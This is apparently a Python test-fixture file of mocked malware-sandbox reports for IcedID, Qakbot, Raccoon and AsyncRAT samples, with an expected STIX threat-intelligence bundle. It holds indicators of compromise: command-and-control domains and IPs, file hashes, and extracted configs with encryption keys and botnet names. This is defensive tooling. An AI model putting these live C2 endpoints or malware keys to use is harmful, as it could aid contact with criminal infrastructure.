from datetime import datetime

query_210609_c67qy7hmpe = {
    "version": "0.2.3",
    "sample": {
        "id": "210609-c67qy7hmpe",
        "score": 10,
        "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
        "size": 59480,
        "md5": "a99f6f41e94c0c9dac365e9bd194391c",
        "sha1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
        "sha256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
        "sha512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
        "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
        "created": "2021-06-09T19:14:10Z",
        "completed": "2021-06-09T19:17:42Z",
    },
    "tasks": [
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b.dll",
            "backend": "fu1m1",
            "resource": "win7v20210410",
            "platform": "windows7_x64",
            "queue_id": 3195198,
        },
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b.dll",
            "backend": "horse2",
            "resource": "win10v20210408",
            "platform": "windows10_x64",
            "queue_id": 3195199,
        },
        {
            "sample": "210609-c67qy7hmpe",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["icedid"],
        "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "size": 59480,
            "md5": "a99f6f41e94c0c9dac365e9bd194391c",
            "sha1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
            "sha256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
            "sha512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
            "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
            "tags": ["family:icedid", "campaign:515013989", "banker", "trojan"],
            "family": ["icedid"],
            "signatures": [
                {
                    "label": "icedid",
                    "name": "IcedID, BokBot",
                    "score": 10,
                    "tags": ["trojan", "banker", "family:icedid"],
                    "desc": "IcedID is a banking trojan capable of stealing credentials.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
            ],
            "iocs": {
                "urls": ["https://aws.amazon.com/", "http://dilmopozira.top/"],
                "domains": ["aws.amazon.com", "dilmopozira.top"],
                "ips": ["8.8.8.8", "13.227.208.72", "172.67.213.147", "104.21.45.114"],
            },
        }
    ],
    "signatures": [
        {
            "label": "icedid",
            "name": "IcedID, BokBot",
            "score": 10,
            "tags": ["trojan", "banker", "family:icedid"],
            "desc": "IcedID is a banking trojan capable of stealing credentials.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/1032-61-0x00000000001D0000-0x000000000021D000-memory.dmp",
            "resource": "behavioral1/memory/1032-61-0x00000000001D0000-0x000000000021D000-memory.dmp",
            "config": {
                "family": "icedid",
                "rule": "IcedidFirstLoader",
                "c2": ["dilmopozira.top"],
                "campaign": "515013989",
            },
        }
    ],
}

query_210609_8ddyb8de5s = {
    "version": "0.2.3",
    "sample": {
        "id": "210609-8ddyb8de5s",
        "score": 10,
        "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
        "size": 531585,
        "md5": "4ca603fb87d28b9da39f1174a426da43",
        "sha1": "d265a8d6da40244503867c8d59d8eeb136544a3d",
        "sha256": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc7416a45471fe817ce377d",
        "sha512": "53907a5812f70114e44edab589e9455eddcd3fd0e997475dada178ea568c943c"
        "8db0d41cb58b725832973ed035fb47f6fc412c210ee8760767ab0047becbf38d",
        "created": "2021-06-09T19:02:22Z",
        "completed": "2021-06-09T19:05:30Z",
    },
    "tasks": [
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "backend": "horse2",
            "resource": "win7v20210408",
            "platform": "windows7_x64",
            "queue_id": 3195040,
        },
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "backend": "fu1m1",
            "resource": "win10v20210410",
            "platform": "windows10_x64",
            "queue_id": 3195041,
        },
        {
            "sample": "210609-8ddyb8de5s",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["icedid"],
        "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc74.dll",
            "size": 531585,
            "md5": "4ca603fb87d28b9da39f1174a426da43",
            "sha1": "d265a8d6da40244503867c8d59d8eeb136544a3d",
            "sha256": "d7b9ef581459a0d8f94b789ae07a9e0892c0f0d0bcc7416a45471fe817ce377d",
            "sha512": "53907a5812f70114e44edab589e9455eddcd3fd0e997475dada178ea568c943c"
            "8db0d41cb58b725832973ed035fb47f6fc412c210ee8760767ab0047becbf38d",
            "tags": ["family:icedid", "campaign:2369677829", "banker", "trojan"],
            "family": ["icedid"],
            "signatures": [
                {
                    "label": "icedid",
                    "name": "IcedID, BokBot",
                    "score": 10,
                    "tags": ["trojan", "banker", "family:icedid"],
                    "desc": "IcedID is a banking trojan capable of stealing credentials.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
            ],
            "iocs": {
                "urls": ["https://aws.amazon.com/", "http://potimomainger.top/"],
                "domains": ["aws.amazon.com", "potimomainger.top"],
                "ips": ["8.8.8.8", "13.227.208.72", "104.21.36.6"],
            },
        }
    ],
    "signatures": [
        {
            "label": "icedid",
            "name": "IcedID, BokBot",
            "score": 10,
            "tags": ["trojan", "banker", "family:icedid"],
            "desc": "IcedID is a banking trojan capable of stealing credentials.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/1208-60-0x0000000001BC0000-0x0000000001BC7000-memory.dmp",
            "resource": "behavioral1/memory/1208-60-0x0000000001BC0000-0x0000000001BC7000-memory.dmp",
            "config": {
                "family": "icedid",
                "rule": "IcedidFirstLoader",
                "c2": ["potimomainger.top"],
                "campaign": "2369677829",
            },
        }
    ],
}


query_icedid = {
    "data": [
        {
            "id": "210609-c67qy7hmpe",
            "status": "reported",
            "kind": "file",
            "filename": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113",
            "tasks": [
                {"id": "static1", "status": "reported"},
                {
                    "id": "behavioral1",
                    "status": "reported",
                    "target": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113.dll",
                },
                {
                    "id": "behavioral2",
                    "status": "reported",
                    "target": "0a2ef710d189cb3b5e94a2f38de3950a20b84c891cec6dbfe83e2394fdabc113.dll",
                },
            ],
            "submitted": datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
            "completed": "2021-06-15T07:47:36Z",
        }
    ],
}

query_qakbot = {
    "data": [
        {
            "id": "210614-dgzch44pyn",
            "status": "reported",
            "kind": "file",
            "filename": "qbot-0614.bin",
            "tasks": [
                {"id": "static1", "status": "reported"},
                {
                    "id": "behavioral1",
                    "status": "reported",
                    "target": "qbot-0614.bin.dll",
                },
                {
                    "id": "behavioral2",
                    "status": "reported",
                    "target": "qbot-0614.bin.dll",
                },
            ],
            "submitted": datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ"),
            "completed": "2021-06-14T16:50:01Z",
        }
    ],
}

query_210614_dgzch44pyn = {
    "version": "0.2.3",
    "sample": {
        "id": "210614-dgzch44pyn",
        "score": 10,
        "target": "qbot-0614.bin",
        "size": 1090048,
        "md5": "2fc699eb45d1351b56eca349ae09638a",
        "sha1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
        "sha256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
        "sha512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
        "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
        "created": "2021-06-14T16:48:08Z",
        "completed": "2021-06-14T16:50:01Z",
    },
    "tasks": [
        {
            "sample": "210614-dgzch44pyn",
            "kind": "behavioral",
            "name": "behavioral1",
            "status": "reported",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "score": 10,
            "target": "qbot-0614.bin.dll",
            "backend": "horse2",
            "resource": "win7v20210408",
            "platform": "windows7_x64",
            "queue_id": 3212009,
        },
        {
            "sample": "210614-dgzch44pyn",
            "kind": "behavioral",
            "name": "behavioral2",
            "status": "reported",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "score": 10,
            "target": "qbot-0614.bin.dll",
            "backend": "fu1m1",
            "resource": "win10v20210410",
            "platform": "windows10_x64",
            "queue_id": 3212010,
        },
        {
            "sample": "210614-dgzch44pyn",
            "kind": "static",
            "name": "static1",
            "status": "reported",
        },
    ],
    "analysis": {
        "score": 10,
        "family": ["qakbot"],
        "tags": [
            "family:qakbot",
            "botnet:obama59",
            "campaign:1623398674",
            "banker",
            "stealer",
            "trojan",
        ],
    },
    "targets": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "score": 10,
            "target": "qbot-0614.bin",
            "size": 1090048,
            "md5": "2fc699eb45d1351b56eca349ae09638a",
            "sha1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
            "sha256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
            "sha512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
            "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
            "tags": [
                "family:qakbot",
                "botnet:obama59",
                "campaign:1623398674",
                "banker",
                "stealer",
                "trojan",
            ],
            "family": ["qakbot"],
            "signatures": [
                {
                    "label": "qakbot",
                    "name": "Qakbot/Qbot",
                    "score": 10,
                    "tags": ["trojan", "banker", "stealer", "family:qakbot"],
                    "desc": "Qbot or Qakbot is a sophisticated worm with banking capabilities.",
                },
                {
                    "label": "schtasks_persist",
                    "name": "Creates scheduled task(s)",
                    "ttp": ["T1053"],
                    "tags": ["persistence"],
                    "desc": "Schtasks is often used by malware for persistence to perform post-infection execution.",
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: MapViewOfSection"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
        }
    ],
    "signatures": [
        {
            "label": "qakbot",
            "name": "Qakbot/Qbot",
            "score": 10,
            "tags": ["trojan", "banker", "stealer", "family:qakbot"],
            "desc": "Qbot or Qakbot is a sophisticated worm with banking capabilities.",
        },
        {
            "label": "schtasks_persist",
            "name": "Creates scheduled task(s)",
            "ttp": ["T1053"],
            "tags": ["persistence"],
            "desc": "Schtasks is often used by malware for persistence to perform post-infection execution.",
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: MapViewOfSection"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "extracted": [
        {
            "tasks": ["behavioral1", "behavioral2"],
            "dumped_file": "memory/2004-61-0x00000000750B0000-0x00000000750ED000-memory.dmp",
            "resource": "behavioral1/memory/2004-61-0x00000000750B0000-0x00000000750ED000-memory.dmp",
            "config": {
                "family": "qakbot",
                "rule": "Qakbot",
                "c2": [
                    "105.198.236.101:443",
                ],
                "version": "402.68",
                "botnet": "obama59",
                "campaign": "1623398674",
            },
        }
    ],
}

query_kdfjzkhfehvfjz = {"data": [], "next": "null"}

query_211006_qkva7sbdgj = {
    "analysis": {
        "family": ["raccoon"],
        "score": 10,
        "tags": [
            "family:raccoon",
            "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
            "stealer",
        ],
    },
    "extracted": [
        {
            "config": {
                "attr": {
                    "url4cnc": [
                        "http://teletop.top/iot3redisium",
                        "http://teleta.top/iot3redisium",
                        "https://t.me/iot3redisium",
                    ]
                },
                "botnet": "27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "family": "raccoon",
                "keys": [
                    {"key": "config_key", "kind": "rc4.plain", "value": "iV8+pT5$yP7{"},
                    {
                        "key": "cnc_key",
                        "kind": "rc4.plain",
                        "value": "3d22d40e8c018c16294c0da2f963eac1",
                    },
                ],
                "rule": "Raccoon",
                "version": "1.8.2",
            },
            "dumped_file": "memory/1928-62-0x0000000000000000-mapping.dmp",
            "resource": "behavioral1/memory/1928-62-0x0000000000000000-mapping.dmp",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "sample": {
        "completed": "2021-10-06T13:22:24Z",
        "created": "2021-10-06T13:19:39Z",
        "id": "211006-qkva7sbdgj",
        "md5": "03ce02744fd076b14a4af3dd7c6574b2",
        "score": 10,
        "sha1": "f78ed7f8402b46e6a514d1dfd993710796ef9788",
        "sha256": "b7e586f26bca40a24e14dadfe0df9902d34da6cc737ae22a91c21ebe0e98e66d",
        "sha512": "e06be2e4936cc07a8484eb3e9eeced63998447f3c25f7e4f1cb3358afe25fd57"
        "72b13b020f9510021df9fffd493d5d9747d3b33a3228c24662533af5f5c93914",
        "size": 606495,
        "target": "IMAGE-07102021.7z",
    },
    "signatures": [
        {
            "desc": "Simple but powerful infostealer which was very active in 2019.",
            "label": "raccoon",
            "name": "Raccoon",
            "score": 10,
            "tags": ["stealer", "family:raccoon"],
        },
        {"name": "Suspicious use of NtCreateProcessExOtherParentProcess", "score": 10},
        {"name": "Loads dropped DLL", "score": 7},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "program_crash", "name": "Program crash", "score": 3},
        {
            "indicators": [
                {
                    "resource": "static1/unpack001/IMAGE-07102021.exe",
                    "yara_rule": "nsis_installer_1",
                },
                {
                    "resource": "static1/unpack001/IMAGE-07102021.exe",
                    "yara_rule": "nsis_installer_2",
                },
            ],
            "name": "NSIS installer",
            "score": 1,
            "tags": ["installer"],
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious behavior: GetForegroundWindowSpam"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "family": ["raccoon"],
            "iocs": {
                "domains": ["teletop.top"],
                "ips": ["8.8.8.8", "104.21.17.146", "185.163.47.232"],
                "urls": ["http://teletop.top/iot3redisium", "http://185.163.47.232/"],
            },
            "md5": "f626600409cd7eaa72c1105a52002cd5",
            "pick": "unpack001/IMAGE-07102021.exe",
            "score": 10,
            "sha1": "f6f5202b9e38a257f5f0bbc784eb4b9ff6c481af",
            "sha256": "459d4fd9bd7ec69f47d9c3306856a7e6ec39b17ff2c88ae80dcac8e9daba760e",
            "sha512": "f0f6c423af7b0746c6687048b49d378988714321d5d353400616929dfc591da8"
            "77fe658d9c6a36dbb859c33b788f8005db72fa981944a80476d57929d7a46524",
            "signatures": [
                {
                    "desc": "Simple but powerful infostealer which was very active in 2019.",
                    "label": "raccoon",
                    "name": "Raccoon",
                    "score": 10,
                    "tags": ["stealer", "family:raccoon"],
                },
                {
                    "name": "Suspicious use of NtCreateProcessExOtherParentProcess",
                    "score": 10,
                },
                {"name": "Loads dropped DLL", "score": 7},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s).",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "program_crash", "name": "Program crash", "score": 3},
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious behavior: GetForegroundWindowSpam"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 622595,
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
            "tasks": ["behavioral1", "behavioral2"],
        }
    ],
    "tasks": {
        "211006-qkva7sbdgj-behavioral1": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral1",
            "pick": "static1/unpack001/IMAGE-07102021.exe",
            "platform": "windows7_x64",
            "queue_id": 3498328,
            "resource": "win7v20210408",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
        },
        "211006-qkva7sbdgj-behavioral2": {
            "backend": "horse2",
            "kind": "behavioral",
            "name": "behavioral2",
            "pick": "static1/unpack001/IMAGE-07102021.exe",
            "platform": "windows10_x64",
            "queue_id": 3498329,
            "resource": "win10v20210408",
            "score": 10,
            "status": "reported",
            "tags": [
                "family:raccoon",
                "botnet:27c9b6ae257af0ad6f3f3330ea633fc782fa4daf",
                "stealer",
            ],
            "target": "IMAGE-07102021.exe",
        },
        "211006-qkva7sbdgj-static1": {
            "kind": "static",
            "name": "static1",
            "score": 1,
            "status": "reported",
        },
    },
    "version": "0.2.3",
}

triage_raw_results = [
    {
        "malware": "icedid",
        "samples": {
            "210609-c67qy7hmpe": {
                "sample_c2s": ["dilmopozira.top"],
                "sample_urls": [],
                "sample_hashes": [
                    "a99f6f41e94c0c9dac365e9bd194391c",
                    "12c8adf784f2e3072cd6142d87c052e3fddde059",
                    "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
                    "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
                    "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
                ],
            }
        },
    },
    {
        "malware": "qakbot",
        "samples": {
            "210614-dgzch44pyn": {
                "sample_c2s": ["105.198.236.101:443"],
                "sample_urls": [],
                "sample_hashes": [
                    "2fc699eb45d1351b56eca349ae09638a",
                    "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
                    "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
                    "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
                    "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
                ],
            }
        },
    },
]

expected_bundle = {
    "type": "bundle",
    "id": "bundle--5b10333c-12eb-46aa-b32e-8714fc9c7345",
    "objects": [
        {
            "type": "domain-name",
            "id": "domain-name--a343632b-4b97-4374-86da-0a66dbb87c52",
            "value": "dilmopozira.top",
            "x_inthreat_tags": [{"name": "icedid", "valid_from": "2021-06-16T09:40:16.591437Z"}],
            "x_external_references": [
                {
                    "description": "icedid sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210609-c67qy7hmpe",
                }
            ],
        },
        {
            "type": "file",
            "id": "file--251dd6ff-d8cd-4ce7-a2e9-575decab7b6e",
            "hashes": {
                "MD5": "a99f6f41e94c0c9dac365e9bd194391c",
                "SHA-1": "12c8adf784f2e3072cd6142d87c052e3fddde059",
                "SHA-256": "0d78a33a77954db9c2fd31198710d9beef5f8e1b5147890231896f5628bc4a2b",
                "SHA-512": "569184b18e66eaa908744acfddc83ec954d1e62d69c254634c60e48f8f5b036b"
                "94ab8ddb32a8431c4a17312a97b4cc4a53dfef3957bf5dc627449ed8e88427df",
            },
            "x_inthreat_tags": [{"name": "icedid", "valid_from": "2021-06-16T09:40:16.59151Z"}],
            "x_external_references": [
                {
                    "description": "icedid sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210609-c67qy7hmpe",
                }
            ],
        },
        {
            "type": "ipv4-addr",
            "id": "ipv4-addr--33416f5c-d1ae-4afc-8381-c0a6fef05ea6",
            "value": "105.198.236.101",
            "x_inthreat_tags": [{"name": "qakbot", "valid_from": "2021-06-16T09:40:16.591585Z"}],
            "x_external_references": [
                {
                    "description": "qakbot sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210614-dgzch44pyn",
                }
            ],
        },
        {
            "type": "file",
            "id": "file--9b29b9b8-215f-407d-aee2-551a208bfbaa",
            "hashes": {
                "MD5": "2fc699eb45d1351b56eca349ae09638a",
                "SHA-1": "4b24eb640b3c2a845686a2ab0f8a5ab119faf91e",
                "SHA-256": "d8fc94e976e8c47d37d227fe353b60ba54c31264a08171bf59b575958b122bdc",
                "SHA-512": "5dc4b55547753bae7fbfd566fc0a51625022343d92e1b81b6f18a84c52c03766"
                "adac05dee2af1181049ab62575a2c752e6f907aef3fb3e77f59c1b4092a86106",
            },
            "x_inthreat_tags": [{"name": "qakbot", "valid_from": "2021-06-16T09:40:16.591627Z"}],
            "x_external_references": [
                {
                    "description": "qakbot sample analyzed by Hatching's sandbox",
                    "source_name": "Hatching Triage",
                    "url": "https://tria.ge/210614-dgzch44pyn",
                }
            ],
        },
    ],
}

query_211118_a13draede7 = {
    "analysis": {
        "family": ["asyncrat"],
        "score": 10,
        "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
    },
    "errors": [
        {
            "reason": "static1/unpack001/�: Picked file does not exist",
            "task": "behavioral1",
        },
        {
            "reason": "static1/unpack001/�: Picked file does not exist",
            "task": "behavioral2",
        },
        {
            "reason": "platform exec: exit status 1: image=C:\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\ncommand=\"C"
            ":\\Users\\Admin\\AppData\\Local\\Temp\\'.exe\"\nwdir=C:\\Users\\Admin\\AppData\\Local\\Temp\nPayload err"
            "or: The %1 application cannot be run in Win32 mode.\n",
            "task": "behavioral4",
        },
    ],
    "extracted": [
        {
            "config": {
                "attr": {
                    "anti_vm": "false",
                    "bsod": "false",
                    "delay": 1,
                    "install": "false",
                    "install_folder": "%AppData%",
                    "pastebin_config": "null",
                },
                "botnet": "KHALELMYBROTHER",
                "c2": ["144.217.68.78:3010"],
                "family": "asyncrat",
                "keys": [
                    {
                        "key": "aes_key",
                        "kind": "aes.plain",
                        "value": "4DQWehnmo5t8kMYDlbosDtwhTY3tZNXg",
                    }
                ],
                "mutex": ["DcRat44Mgfgfutex_qwqdanfgfgchun"],
                "rule": "AsyncRAT",
                "version": "1.0.7",
            },
            "dumped_file": "memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
            "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
            "tasks": ["behavioral3"],
        }
    ],
    "sample": {
        "completed": "2021-11-18T00:42:12Z",
        "created": "2021-11-18T00:41:34Z",
        "id": "211118-a13draede7",
        "md5": "9a1fba64aa6a810a9691fb4a2b9dd7bd",
        "score": 10,
        "sha1": "910fd3c47d834de5af91466bb57a03c21da6e916",
        "sha256": "9ec9d84b8ea1265c494954a81509df8444583965182729a000a99a9562a9e28e",
        "sha512": "d0d2dc966bdaba673fee2a5cf7feb7fab2a02038c0706b20538b852d7715e0aa"
        "7383bc5787fee7e6133dc76a5e76ba075902069668d9a23885747db9fb3b4862",
        "size": 252099,
        "target": "invoice.zip",
    },
    "signatures": [
        {
            "desc": "AsyncRAT is designed to remotely monitor and control other computers.",
            "label": "asyncrat",
            "name": "AsyncRat",
            "score": 10,
            "tags": ["rat", "family:asyncrat"],
        },
        {
            "label": "creates_com_server_autorun",
            "name": "Registers COM server for autorun",
            "score": 10,
            "tags": ["persistence"],
            "ttp": ["T1060"],
        },
        {
            "indicators": [
                {
                    "resource": "behavioral3/memory/824-124-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/3444-130-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/1060-136-0x000000000040CB9E-mapping.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-148-0x0000000005A40000-0x0000000005A47000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
                {
                    "resource": "behavioral3/memory/824-152-0x0000000006C50000-0x0000000006C59000-memory.dmp",
                    "yara_rule": "asyncrat",
                },
            ],
            "name": "Async RAT payload",
            "score": 9,
            "tags": ["rat"],
        },
        {"name": "Loads dropped DLL", "score": 7},
        {"name": "Suspicious use of SetThreadContext", "score": 5},
        {
            "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviour.",
            "label": "file_antivm_ide_drive",
            "name": "Enumerates physical storage devices",
            "score": 3,
            "ttp": ["T1082"],
        },
        {"label": "reg_software_classes", "name": "Modifies registry class"},
        {
            "label": "modifies_certificate_store_registry",
            "name": "Modifies system certificate store",
            "tags": ["evasion", "spyware", "trojan"],
            "ttp": ["T1130", "T1112"],
        },
        {"name": "Suspicious behavior: EnumeratesProcesses"},
        {"name": "Suspicious use of AdjustPrivilegeToken"},
        {"name": "Suspicious use of WriteProcessMemory"},
    ],
    "targets": [
        {
            "md5": "72565e7a0145e0657e586f6cf7696dc7",
            "pick": "unpack001/'",
            "score": 1,
            "sha1": "11eba7b1e26cc7d492a2c161ac48370811d0b01e",
            "sha256": "6f1c9b4c187669bc0371260d121caf48d65f829a9104c483befbd8fc0bed24f5",
            "sha512": "e099ac9c0e6ed1ff8c3307f17ccb13a0306178679a3f7f5ab4b23699fad859b3"
            "101243e2782771ca2b9b8fa2785437fbe71a7f04633f45732eb3e0c998603d20",
            "signatures": [],
            "size": 17600,
            "target": "'",
            "tasks": ["behavioral1", "behavioral2"],
        },
        {
            "family": ["asyncrat"],
            "iocs": {
                "domains": ["time.windows.com"],
                "ips": ["144.217.68.78", "8.8.8.8", "40.119.148.38"],
            },
            "md5": "44da69bb3848a28c8ba2238537a90da6",
            "pick": "unpack001/invoice_payment.vbs",
            "score": 10,
            "sha1": "d538186f09636dc7ce559452bb9b7632fe99fb5c",
            "sha256": "d90936e1911b9a666b60051a817ae1b91f26e8b89e4d5041bdcad77ea2087c66",
            "sha512": "7d834ab7a9783485b130835215eb2c0766d104a3713a8787971572eac5d21721"
            "0144a008b6aa38df4e6785e4739086fae8c78efc79394d2f527f2a964a51b326",
            "signatures": [
                {
                    "desc": "AsyncRAT is designed to remotely monitor and control other computers.",
                    "label": "asyncrat",
                    "name": "AsyncRat",
                    "score": 10,
                    "tags": ["rat", "family:asyncrat"],
                },
                {
                    "label": "creates_com_server_autorun",
                    "ttp": ["T1060"],
                },
                {
                    "indicators": [
                        {
                            "resource": "behavioral3/memory/824-124-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-123-0x0000000000400000-0x0000000000412000-memory.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/3444-130-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/1060-136-0x000000000040CB9E-mapping.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-148-0x0000000005A40000-0x0000000005A47000-memory.dmp",
                            "yara_rule": "asyncrat",
                        },
                        {
                            "resource": "behavioral3/memory/824-152-0x0000000006C50000-0x0000000006C59000-memory.dmp",
                            "yara_rule": "asyncrat",
                        },
                    ],
                    "name": "Async RAT payload",
                    "score": 9,
                    "tags": ["rat"],
                },
                {"name": "Loads dropped DLL", "score": 7},
                {"name": "Suspicious use of SetThreadContext", "score": 5},
                {
                    "desc": "Attempts to interact with connected storage/optical drive(s). Likely ransomware behaviou",
                    "label": "file_antivm_ide_drive",
                    "name": "Enumerates physical storage devices",
                    "score": 3,
                    "ttp": ["T1082"],
                },
                {"label": "reg_software_classes", "name": "Modifies registry class"},
                {
                    "label": "modifies_certificate_store_registry",
                    "name": "Modifies system certificate store",
                    "tags": ["evasion", "spyware", "trojan"],
                    "ttp": ["T1130", "T1112"],
                },
                {"name": "Suspicious behavior: EnumeratesProcesses"},
                {"name": "Suspicious use of AdjustPrivilegeToken"},
                {"name": "Suspicious use of WriteProcessMemory"},
            ],
            "size": 415172,
            "tags": ["family:asyncrat", "botnet:khalelmybrother", "persistence", "rat"],
            "target": "invoice_payment.vbs",
            "tasks": ["behavioral3"],
        },
        {
            "md5": "6646631ce4ad7128762352da81f3b030",
